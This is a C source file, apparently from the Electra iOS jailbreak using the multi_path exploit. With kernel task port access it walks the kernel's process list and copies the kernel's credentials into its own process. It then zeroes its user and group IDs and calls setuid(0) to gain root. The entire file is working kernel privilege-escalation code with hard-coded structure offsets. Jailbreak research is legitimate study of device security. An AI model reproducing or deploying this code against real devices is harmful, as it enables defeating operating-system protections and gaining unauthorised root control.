//
//  electra.c
//  multi_path
//
//  Created by CoolStar on 6/6/18.
//  Copyright Â© 2018 CoolStar. All rights reserved.
//

#include "noncereboot.h"
#include "sploit.h"
#include "patchfinder64.h"
#include "kutils.h"
#include "kexecute.h"
#include "kmem.h"
#include "offsetof.h"
#include "IOKit.h"

mach_port_t tfpzero;

int start(mach_port_t tfp0) {
    tfpzero = tfp0;
    init_kernel(find_kernel_base(), NULL);
    init_kexecute();
    uint32_t our_pid = getpid();
    uint64_t our_proc = 0;
    uint64_t kern_proc = 0;
    uint64_t proc = rk64(find_allproc());
    while (proc) {
        uint32_t pid = (uint32_t)rk32(proc + offsetof_p_pid);
        char name[40] = {0};
        kread(proc+0x268, name, 20);
        if (pid == our_pid) {
            our_proc = proc;
        } else if (pid == 0) {
            kern_proc = proc;
        }
        proc = rk64(proc);
    }
    uint64_t kern_ucred = 0;
    kexecute(find_copyout(), kern_proc+0x100, (uint64_t)&kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    uint64_t self_ucred = 0;
    kexecute(find_copyout(), our_proc+0x100, (uint64_t)&self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
    kexecute(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
    kexecute(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
    setuid(0);
    term_kexecute();
    return 0;
}
